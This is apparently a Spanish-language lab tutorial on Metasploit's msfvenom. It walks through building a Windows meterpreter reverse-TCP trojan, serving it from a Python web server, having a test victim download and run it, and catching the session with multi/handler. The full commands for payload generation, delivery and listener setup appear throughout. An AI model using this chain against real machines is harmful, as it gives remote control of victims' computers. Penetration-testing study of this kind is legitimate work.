# Msfvenom – Generar Nuestros Propios Payloads

Vamos a crear ejecutables o archivos malicioso de tal forma que al ser ejecutados en una maquina remota podamos tener acceso remoto y hacer una intrusión.

Vamos ha hacernos usuario **root**

`sudo su`

![image.png](./imagenes/image%2032.png)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=443 -f exe -o pwned.exe
```

Al ejecutar el comando generaríamos un Payload malicioso llamado pwned.exe

![image.png](./imagenes/image%2033.png)

![image.png](./imagenes/image%2034.png)

**EXPLICACION DEL COMANDO:**

### **Análisis del comando**

1. **`msfvenom`**:
Es una herramienta de Metasploit utilizada para generar y codificar *payloads* (cargas útiles), las cuales son fragmentos de código malicioso que pueden ser utilizados en pruebas de penetración.
2. **`p windows/x64/meterpreter/reverse_tcp`**:
    - **`p`**: Define el *payload* que se usará.
    - **`windows/x64/meterpreter/reverse_tcp`**: Es un *payload* específico que genera una conexión inversa (reverse shell) en sistemas Windows de arquitectura x64 mediante TCP. Esto significa que la máquina objetivo se conecta de vuelta al atacante.
3. **`LHOST=10.0.3.4`**:
    - **`LHOST`**: Representa la dirección IP de la máquina atacante, que recibirá la conexión de la máquina comprometida.
4. **`LPORT=443`**:
    - **`LPORT`**: Indica el puerto en el que la máquina atacante estará escuchando. En este caso, el puerto 443, que es comúnmente usado por HTTPS y puede pasar inadvertido en redes mal configuradas.
5. **`f exe`**:
    - **`f`**: Especifica el formato del archivo generado. Aquí es un archivo ejecutable de Windows (**.exe**).
6. **`o pwned.exe`**:
    - **`o`**: Designa el nombre del archivo de salida. En este caso, el ejecutable se guarda con el nombre `pwned.exe`.

### **Estructura típica de comandos msfvenom**

El formato habitual para construir comandos con msfvenom es el siguiente:

```
msfvenom -p <payload> [opciones del payload] -f <formato> -o <archivo_salida>

```

### **Elementos principales**:

- **Especificación del payload**: Siempre comienza con `p` seguido del tipo de carga útil (por ejemplo, `windows/x64/meterpreter/reverse_tcp`).
- **Opciones del payload**: Parámetros específicos como `LHOST` (IP local) y `LPORT` (puerto).
- **Formato de salida**: Usando `f` se define el tipo de archivo, como `exe`, `elf`, `apk`, etc.
- **Archivo generado**: Con `o` se guarda el archivo con un nombre específico.

**RECURSOS UTILES:**

- **Recurso como funciona:** [https://www.offsec.com/metasploit-unleashed/msfvenom/](./imagenes/https://www.offsec.com/metasploit-unleashed/msfvenom/)
- **Recurso Payload**: [https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1](./imagenes/https://gist.github.com/dejisec/8cdc3398610d1a0a91d01c9e1fb02ea1)
- **Recurso creando diferentes tipos de payloads:** [https://www.nosolohacking.info/msfvenom-creando-diferentes-tipos-de-payloads/](./imagenes/https://www.nosolohacking.info/msfvenom-creando-diferentes-tipos-de-payloads/)

**Prueba de concepto contra una maquina Windows.**

Kali Linux 

Msf6 

Maquina objetivo

- Miramos el formato adecuado para utilizar en Windows
    
    
    `sudo msfvenom -l format`
    
    ![image.png](./imagenes/image%2035.png)
    

- **En el Metasploit** Hago una búsqueda de un payload para Windows y que tenga meterpreter.

**Arquitectura: x64 (de 64 bits), plataforma Windows, y que nos habrá una shell meterpreter (shell avanzada y multifuncional)**

`search arch:x64 platform:windows type:payload meterpreter`

![image.png](./imagenes/image%2036.png)

- Miro la información de payload 13 (13  payload/windows/x64/meterpreter/reverse_tcp )
    
    `Info 13`
    
    ![image.png](./imagenes/image%2037.png)
    

- Después de escoger el payload creo una orden msfvenom el un terminal para crear un troyano para Windows al que voy a llamar bichopedro.exe .
    
    `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f exe -o bichopedro.exe`
    
    ![image.png](./imagenes/image%2038.png)
    

![image.png](./imagenes/image%2039.png)

- Creamos un servidor web con Python
    
    python3 -m http.server 80
    
    ![image.png](./imagenes/image%2040.png)
    

- Nos vamos a la maquina victima Windows y interpretamos el rol de la victima en el que se conecta a una web y se descarga un archivo.
- En el explorador metemos la IP del servidor web que hemos creado y nos descargaremos el archivo bichopero.exe.
    
    ![image.png](./imagenes/image%2041.png)
    

![image.png](./imagenes/image%2042.png)

![image.png](./imagenes/image%2043.png)

- Vamos a utilizar una herramienta que forma parte de Metasploit y es el Multi handler siendo una alternativa a la herramienta Netcat.
- Cargamos el modulo Multi handler.
    
    `use /multi/handler`
    
    ![image.png](./imagenes/image%2044.png)
    

`show options`

![image.png](./imagenes/image%2045.png)

Rellenamos los datos que nos haga falta. En este caso Nos falta el local Host (**LHOST**) y debemos **recordar que al crear el payload especificamos el puerto en el 4444 pero si hubiéramos puesto otro puerto**  **aquí** también **debemos especificar ese puerto de escucha en LPORT.**

- OJO!! Que aqui hay trampa. Recordemos que en **MSFVENOM** preparamos **un payload para recibir un meterpreter** no una shell . Eso **implica que dentro de este Payload también debo poner** que quiero recibir **una sesión de meterpreter**.
    
    ![image.png](./imagenes/image%2046.png)
    
- Le decimos que cargue el mismo payload.
    
    `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
    
    ![image.png](./imagenes/image%2047.png)
    

`show options`

![image.png](./imagenes/image%2048.png)

`set LHOST 10.0.3.4`

`show options`

![image.png](./imagenes/image%2049.png)

- Ejecutamos el Multi handler
    
    **`run`**
    
    ![image.png](./imagenes/image%2050.png)
    

- Ejecutamos en la maquina Windows el archivo infectado
    
    ![image.png](./imagenes/image%2051.png)
    
    Recibimos una conexión de Meterpreter y estamos dentro de la maquina.
    
    ![image.png](./imagenes/image%2052.png)